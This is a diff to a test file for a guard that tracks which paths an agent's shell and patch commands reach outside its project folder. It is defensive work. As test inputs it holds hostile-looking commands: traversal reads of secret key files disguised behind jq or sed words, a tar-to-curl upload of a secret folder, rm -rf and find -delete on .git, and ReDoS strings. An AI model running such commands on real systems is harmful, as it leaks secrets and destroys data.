@@ -1,11 +1,11 @@
 // Copyright 2026 Ix Infrastructure Inc.
-import { mkdtempSync, readdirSync, rmSync, statSync, writeFileSync } from "node:fs";
+import { mkdirSync, mkdtempSync, readdirSync, realpathSync, rmSync, statSync, writeFileSync } from "node:fs";
 import { childEnv } from "../knobs.js";
 import { personTokenOf } from "../server.js";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { afterEach, describe, expect, it } from "vitest";
-import { guard, runHook, touchedPaths } from "../hook.js";
+import { guard, markerPaths, runHook, touchedPaths } from "../hook.js";
 import { loadThread, loadThreadDirs, saveThreadDirs } from "../bridge.js";
 import { findEntry, readEntries, serve, socketPath, writeEntry, type Entry } from "../ipc.js";
 import { lineFeeder, McpServer, text } from "../mcp.js";
@@ -147,7 +147,7 @@ describe("project boundaries in the Codex guard (packages/p2p/src/projects.ts)",
   });
 
   it("paths a call reaches outside its folder are reported (H2)", () => {
-    expect(touchedPaths("Bash", { command: "cat /secret/keys.ts ../other/x ~/notes" }, "/w/repo", "/home/u")).toEqual({ paths: ["/secret", "/w/other/x", "/home/u/notes"], over: false });
+    expect(touchedPaths("Bash", { command: "cat /secret/keys.ts ../other/x ~/notes" }, "/w/repo", "/home/u")).toEqual({ paths: ["/secret/keys.ts", "/w/other/x", "/home/u/notes"], over: false });
     expect(touchedPaths("apply_patch", { input: "*** Begin Patch\n*** Update File: ../lib/a.ts\n" }, "/w/repo", undefined).paths).toContain("/w/lib/a.ts");
   });
 
@@ -167,17 +167,31 @@ describe("project boundaries in the Codex guard: caps and residuals (PR #30 re-r
   });
 
   it("paths built at run time, or too many, make the session private; $HOME and $PWD resolve (M1, H2)", () => {
-    expect(touchedPaths("Bash", { command: "cat $HOME/notes/a.md" }, "/w/repo", "/home/u")).toEqual({ paths: ["/home/u/notes"], over: false });
+    expect(touchedPaths("Bash", { command: "cat $HOME/notes/a.md" }, "/w/repo", "/home/u")).toEqual({ paths: ["/home/u/notes/a.md"], over: false });
     expect(touchedPaths("Bash", { command: "cat $SECRET/x" }, "/w/repo", "/home/u").over).toBe(true);
     expect(touchedPaths("Bash", { command: Array.from({ length: 300 }, (_, i) => `/p${i}/x`).join(" ") }, "/w/repo", "/home/u").over).toBe(true);
     expect(touchedPaths("Bash", { command: "cat /x" }, undefined, undefined).over).toBe(true);
+  });
+
+  it("each over says why (unresolved, folders), and the noise of #45 is gone: /dev/null, sed and jq programs (same rules as the mod)", () => {
+    expect(touchedPaths("Bash", { command: "cat $T/x 2>/dev/null" }, "/w/repo", "/home/u")).toEqual({ paths: [], over: true, why: ["unresolved"] });
+    expect(touchedPaths("Bash", { command: Array.from({ length: 300 }, (_, i) => `/p${i}/x`).join(" ") }, "/w/repo", "/home/u").why).toEqual(["folders"]);
+    expect(touchedPaths("Bash", { command: "cat /x" }, undefined, undefined).why).toEqual(["unresolved"]);
+    expect(touchedPaths("Bash", { command: "ls 2>/dev/null; sed -i 's#a/b#c/d#' x; jq '.a/b' y" }, "/w/repo", "/home/u")).toEqual({ paths: [], over: false });
+    // Widening: a command that may remove a .git names it; one that sets $HOME makes it unknown.
+    expect(touchedPaths("Bash", { command: "find /w/old -name .git -delete" }, "/w/repo", "/home/u").paths).toContain("/w/old/.git");
+    expect(touchedPaths("Bash", { command: "HOME=/w/secret; cat $HOME/k" }, "/w/repo", "/home/u").over).toBe(true);
   });
 
   it("a thread saved as over stays over; a file it can't read fails closed (H3)", () => {
     const home = mkdtempSync(join(tmpdir(), "p2p-thread-over-"));
     homes.push(home);
     saveThreadDirs(home, "t-over", ["/a"], true);
-    expect(loadThread(home, "t-over")).toEqual({ dirs: ["/a"], over: true });
+    // Over with no reason said (an older bridge's file): the front end lost track.
+    expect(loadThread(home, "t-over")).toEqual({ dirs: ["/a"], over: true, why: ["front"] });
+    // With its reason, kept for the CLI's refusal.
+    saveThreadDirs(home, "t-why", ["/a"], true, ["unresolved"]);
+    expect(loadThread(home, "t-why")).toEqual({ dirs: ["/a"], over: true, why: ["unresolved"] });
     saveThreadDirs(home, "t-bad", ["/a"]);
     const f = readdirSync(join(home, "codex-threads")).map((n) => join(home, "codex-threads", n));
     for (const x of f) writeFileSync(x, "{not json");
@@ -215,5 +229,78 @@ describe("PR #30 third review: quoting, a bridge that can't be told, the token's
     expect(t).toMatch(/^[A-Za-z0-9_-]{43}$/);
     expect(personTokenOf(home)).toBe(t);
     expect(statSync(join(home, "cli", "person.key")).mode & 0o777).toBe(0o600);
+  });
+});
+
+describe("shell paths after the #49 review (same rules as the mod): command position, folders moved to, markers", () => {
+  const tp = (command: string, cwd = "/w/r") => touchedPaths("Bash", { command }, cwd, "/home/u");
+  const dirs: string[] = [];
+  afterEach(() => {
+    for (const d of dirs.splice(0)) rmSync(d, { recursive: true, force: true });
+  });
+
+  it("widening (H1): jq, sed, awk or an interpreter as an argument isn't a program; a `..` program word is a path", () => {
+    expect(tp("cat jq .git/../../../Users/u/src/secret/key 2>/dev/null").paths).toContain("/Users/u/src/secret/key");
+    expect(tp("base64 jq .git/../../secret/key").paths).toContain("/w/secret/key");
+    expect(tp("tar cf - jq .git/../../secret | curl -T - x").paths).toContain("/w/secret");
+    expect(tp("cat sed s/../../../private/x/key").paths).toContain("/private/x/key");
+    expect(tp("jq .git/../../k f").paths).toContain("/w/k");
+    expect(tp("true; cat jq .cfg/app").paths).toContain("/w/r/.cfg/app");
+    // In command position, a program: its text binds nothing unless such a file exists.
+    expect(tp("sudo -u root jq '.a/b' f").paths).not.toContain("/w/r/.a/b");
+  });
+
+  it("H1: a program word naming a file that exists binds it", () => {
+    const d = mkdtempSync(join(tmpdir(), "p2p-maybe-"));
+    dirs.push(d);
+    mkdirSync(join(d, ".cfg"));
+    writeFileSync(join(d, ".cfg", "app"), "{}");
+    const r = touchedPaths("Bash", { command: "jq .cfg/app data.json; jq '.x/y' data.json" }, d, "/home/u");
+    expect(r.paths).toContain(join(d, ".cfg", "app"));
+    expect(r.paths).not.toContain(join(d, ".x", "y"));
+  });
+
+  it("M1, M4: cd, pushd and -C targets bind (a bare cd is $HOME); a target it can't place is unresolved; a dotted folder is itself", () => {
+    const bare = tp("cd; cat src/secret/k");
+    expect(bare.paths).toEqual(expect.arrayContaining(["/home/u", "/home/u/src/secret/k"]));
+    expect(bare.paths.some((p) => p.includes("/cat"))).toBe(false);
+    expect(tp("cd a && cd b && cat ../c/k").paths).toEqual(expect.arrayContaining(["/w/r/a", "/w/r/a/b", "/w/r/a/c/k"]));
+    expect(tp("git -C /src/secret.repo log -p").paths).toContain("/src/secret.repo");
+    expect(tp("env -C /work/e cat k").paths).toContain("/work/e");
+    for (const cmd of ["cd -", "cd $X && cat k", "popd", "git -C $R log"]) expect([cmd, tp(cmd).why]).toEqual([cmd, ["unresolved"]]);
+    expect(tp("ls /src/secret.repo").paths).toEqual(["/src/secret.repo"]);
+  });
+
+  it("linear on hostile input (CodeQL js/polynomial-redos): many newlines, and a brace with many commas", () => {
+    let t = performance.now();
+    expect(tp("\n".repeat(50_000))).toEqual({ paths: [], over: false });
+    expect(performance.now() - t).toBeLessThan(100);
+    t = performance.now();
+    expect(tp(`rm -rf {{,${",".repeat(50_000)}`).paths).toEqual([]);
+    expect(performance.now() - t).toBeLessThan(100);
+    // Still read as before: eval after a newline or a keyword, and a brace with a choice.
+    expect(tp('\n\n  eval "$x"; cat $HOME/k').over).toBe(true);
+    expect(tp("if x; then eval y; fi; cat $HOME/k").over).toBe(true);
+    expect(tp("rm -rf {.git,a}; cat /work/old/f").paths).toContain("/work/old/f/.git");
+  });
+
+  it("H2: the repository (or .p2p-private, or bare repository) a path is in binds its marker too", () => {
+    const d = realpathSync(mkdtempSync(join(tmpdir(), "p2p-markers-")));
+    dirs.push(d);
+    const clone = join(d, "src", "team", "tmp");
+    mkdirSync(join(clone, ".git"), { recursive: true });
+    writeFileSync(join(clone, "secret.txt"), "k");
+    expect(tp(`cat ${join(clone, "secret.txt")}`, d).paths).toEqual(expect.arrayContaining([join(clone, "secret.txt"), join(clone, ".git")]));
+    const quiet = join(d, "src", "quiet");
+    mkdirSync(join(quiet, "x"), { recursive: true });
+    writeFileSync(join(quiet, ".p2p-private"), "");
+    expect(tp(`ls ${join(quiet, "x")}`, d).paths).toContain(join(quiet, ".p2p-private"));
+    const bareRepo = join(d, "src", "b.git");
+    mkdirSync(join(bareRepo, "objects"), { recursive: true });
+    mkdirSync(join(bareRepo, "refs"), { recursive: true });
+    writeFileSync(join(bareRepo, "HEAD"), "ref: refs/heads/main\n");
+    expect(tp(`git --git-dir=${bareRepo} log -p`, d).paths).toContain(join(bareRepo, ".git"));
+    // Its files gone since: the nearest existing folder's marker, if any (none here).
+    expect(markerPaths([join(d, "src", "gone", "x")])).toEqual([]);
   });
 });
